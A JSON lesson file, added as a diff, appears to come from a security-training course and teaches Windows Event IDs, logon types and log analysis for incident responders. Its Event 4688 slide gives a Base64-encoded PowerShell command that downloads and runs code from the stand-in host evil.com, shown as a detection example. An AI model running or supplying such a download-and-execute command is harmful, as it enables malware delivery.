@@ -1,0 +1,77 @@
+{
+    "id": "l2",
+    "chapterId": "ch_4",
+    "title": "Windows Security Events Decoded",
+    "description": "Mastering Event IDs and Logon Types.",
+    "xpReward": 30,
+    "estimatedMinutes": 8,
+    "section": "Windows",
+    "slides": [
+        {
+            "id": "s_l2_1",
+            "type": "text",
+            "title": "Windows Event Logs 101 📒",
+            "content": "# The Built-In Detective\n\nEvery modern Windows system continuously writes events to logs. These are **invaluable** for incident response.\n\n**Accessing Logs:** Type `eventvwr.msc` in the Run dialog.\n**Main Channels:**\n*   **Security:** Auditing events (Logon, Logoff, Privilege Use).\n*   **System:** OS component events (Service crashes, time changes).\n*   **Application:** Third-party app events.\n\n**Key Concept: Event ID.** Each type of activity has a unique number. **You MUST memorize the critical Event IDs below.**"
+        },
+        {
+            "id": "s_l2_2",
+            "type": "code",
+            "title": "Critical Event IDs - Print This! 🖨️",
+            "content": "These are the 10 events you will hunt for every single day.",
+            "codeSnippet": "4624 - Successful Logon (User logged in)\n4625 - Failed Logon (Bad password / Brute force)\n4648 - Logon using explicit credentials (RunAs / Lateral Movement)\n4672 - Special Privileges Assigned (Admin rights granted)\n4688 - Process Creation (Program started)\n4697 - Service Installed (Backdoor persistence!)\n4720 - User Account Created\n4726 - User Account Deleted\n5140 - Network Share Accessed\n5156 - Windows Filtering Platform (Network connection allowed)",
+            "codeLanguage": "text",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_3",
+            "type": "quiz",
+            "title": "Event ID Pop Quiz 📝",
+            "content": "",
+            "quizData": {
+                "id": "q_l2_1",
+                "type": "multiple_choice",
+                "question": "You see 50 consecutive Event ID **4625** entries for the 'Administrator' account in the last minute. What is happening?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The administrator is working late.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "A password spray or brute-force attack.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Windows Update is running.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "4625 = Failed Logon. Multiple failures followed by a 4624 (success) indicates a likely credential compromise.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l2_4",
+            "type": "text",
+            "title": "Logon Types: The Context Matters 🔑",
+            "content": "# How Did They Log In?\n\nEvent ID 4624 (Successful Logon) includes a **Logon Type** field. This tells you **how** the user authenticated.\n\n*   **Type 2: Interactive.** User physically at the keyboard (or RDP).\n*   **Type 3: Network.** Accessing a shared folder or printer.\n*   **Type 5: Service.** A background service starting.\n*   **Type 7: Unlock.** Workstation unlocked.\n*   **Type 10: RemoteInteractive.** **RDP Connection!**\n\n**SOC Insight:** If you see a **Type 10 (RDP)** logon for a Domain Admin account from an IP address in a foreign country, **you are under active attack.** This is a \"Get Off the Network\" moment."
+        },
+        {
+            "id": "s_l2_5",
+            "type": "code",
+            "title": "Anatomy of a 4624 Event (XML)",
+            "content": "When you dig into the event details, look for these fields:",
+            "codeSnippet": "<EventID>4624</EventID>\n<Data Name='SubjectUserName'>WIN-123$</Data>\n<Data Name='TargetUserName'>jsmith</Data>\n<Data Name='TargetDomainName'>ACME</Data>\n<Data Name='LogonType'>10</Data>\n<Data Name='IpAddress'>203.0.113.50</Data>\n<Data Name='WorkstationName'>WIN-ATTACKER</Data>",
+            "codeLanguage": "xml",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l2_6",
+            "type": "warning",
+            "title": "Event ID 4688: Process Creation 🚨",
+            "content": "## The Most Important Event You'll Ignore\n\nEvent ID **4688** is generated every time a program runs (Notepad, Chrome, Malware). There are thousands of these per second on a busy system.\n\n**Why it's critical:** It contains the **Command Line** arguments.\n*   *Normal:* `C:\\Windows\\System32\\svchost.exe -k netsvcs`\n*   *Malicious:* `C:\\Windows\\System32\\cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA=`\n\nThat long string is a **Base64 encoded PowerShell command**. That's malware."
+        }
+    ]
+}
